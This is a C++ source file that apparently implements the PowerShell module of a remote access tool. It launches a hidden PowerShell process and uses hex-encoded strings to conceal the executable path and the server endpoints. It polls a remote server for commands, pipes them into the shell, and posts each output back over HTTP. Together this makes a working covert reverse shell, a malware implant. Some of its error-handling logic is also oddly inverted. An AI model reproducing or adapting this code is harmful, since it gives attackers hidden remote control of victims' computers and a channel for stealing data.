#include "Powershell.h"

HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;
HANDLE g_hInputFile = NULL;
PROCESS_INFORMATION piProcInfo;

bool Powershell::CreateChildProcess()
{
	PROCESS_INFORMATION piProcInfo;
	STARTUPINFO siStartInfo;
	bool bSuccess = false;
	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdError = g_hChildStd_OUT_Wr;
	siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
	siStartInfo.hStdInput = g_hChildStd_IN_Rd;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
	string p = Encryptions::hexToAscii("433a5c5c57696e646f77735c5c53797374656d33325c5c57696e646f7773506f7765725368656c6c5c5c76312e305c5c706f7765727368656c6c2e657865");
	bSuccess = CreateProcessW(Utils::s2ws(p).c_str(), NULL, NULL, NULL, true, CREATE_NO_WINDOW, NULL, NULL, &siStartInfo, &piProcInfo);
	if (!bSuccess)
	{
		#ifdef _DEBUG
			Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
		#endif
		return false;
	}
	else
	{
		if (CloseHandle(piProcInfo.hProcess) != 0)
		{
			#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
			#endif
			return false;
		}
		else
		{
			#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
			#endif
			return false;
		}
		if (CloseHandle(piProcInfo.hThread) != 0)
		{
			#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
			#endif
		}
	}
	return true;
}

void Powershell::WriteToPipe(string hxcer)
{
	DWORD dwWritten;
	bool bSuccess = false;
	bSuccess = WriteFile(g_hChildStd_IN_Wr, (LPVOID)hxcer.c_str(), (DWORD)hxcer.length(), &dwWritten, NULL);
	if (!bSuccess)
	{
		#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
		#endif
	}
}

void Powershell::ReadFromPipe(char* c, HINTERNET clientInfoSession, string clientId)
{
	DWORD dwWritten;
	DWORD dwRead;
	HttpRequests WinHttpRequests;
	bool bSuccess = false;
	DWORD availableBytes;
	DWORD bytesToRead;
	HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
	for (;;)
	{
		PeekNamedPipe(g_hChildStd_OUT_Rd, NULL, NULL, NULL, &availableBytes, NULL);
		while (availableBytes > 0)
		{
			if (availableBytes <= BUF)
				bytesToRead = availableBytes;
			else
				bytesToRead = BUF;
			LPVOID buffer = malloc(bytesToRead);
			if (buffer == NULL)
				return;
			bSuccess = ReadFile(g_hChildStd_OUT_Rd, buffer, bytesToRead, &dwRead, NULL);
			if (!bSuccess || dwRead == 0)
			{
				#ifdef _DEBUG
					Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
				#endif
				break;
			}
			availableBytes -= bytesToRead;
			bSuccess = WriteFile(hParentStdOut, buffer, dwRead, &dwWritten, NULL);
			if (!bSuccess)
			{
				#ifdef _DEBUG
					Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
				#endif
				break;
			}
			string tempString(static_cast<const char*>(buffer));
			for (int i = 0; i < tempString.length(); i++)
			{
				if(!isascii(tempString[i]))
					tempString[i] = ' ';
			}
			string newString(tempString);
			WinHttpRequests.SendPostData(JsonFunctions::CreatePostJson(newString), clientInfoSession, Encryptions::hexToAscii("2F746F6F6C2F70732F726573706F6E7365"), clientId);
			free(buffer);
		}
	}
}

DWORD WINAPI ReceiveCommand(LPVOID lpParameter)
{
	string hxcer;
	HttpRequests WinHttpRequests;
	PublicStructers::client* clientInfo = reinterpret_cast<PublicStructers::client*>(lpParameter);

	for (;;)
	{
		hxcer = WinHttpRequests.SendGetRequest(Encryptions::hexToAscii("2F746F6F6C2F636F6D6D616E64732F7073"), clientInfo->session, clientInfo->clientId);
		if (hxcer.substr(0, 10) == "No command")
			continue;
		else if (hxcer.substr(0, 4) == "exit")
		{
			Powershell::WriteToPipe(hxcer + "\n");
			break;
		}
		Powershell::WriteToPipe(hxcer + "\n");
	}
	return 0;
}

DWORD WINAPI OutputResult(LPVOID lpParameter)
{
	PublicStructers::client* clientInfo = reinterpret_cast<PublicStructers::client*>(lpParameter);

	Powershell::ReadFromPipe((char*)lpParameter, clientInfo->session, clientInfo->clientId);

	return 0;
}

bool Powershell::CreateShell(PublicStructers::client clientInfo)
{
	SECURITY_ATTRIBUTES saAttr;
	wprintf(L"Parent process ID %u\n", GetCurrentProcessId());
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = true;
	saAttr.lpSecurityDescriptor = NULL;
	if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
	{
		#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
		#endif
		return false;
	}
	if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
	{
		#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
		#endif
		return false;
	}
	if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
	{
		#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
		#endif
		return false;
	}
	if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
	{
		#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
		#endif
		return false;
	}
	if (CreateChildProcess() != 0)
	{
		#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
		#endif
		return false;
	}
	HANDLE rThread = CreateThread(NULL, 0, ReceiveCommand, &clientInfo, 0, NULL);
	if (rThread == NULL)
	{
		#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
		#endif
		return false;
	}
	HANDLE oThread = CreateThread(NULL, 0, OutputResult, &clientInfo, 0, NULL);
	if (oThread == NULL)
	{
		#ifdef _DEBUG
				Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
		#endif
		return false;
	}
	WaitForSingleObject(rThread, INFINITE);
	return true;
}

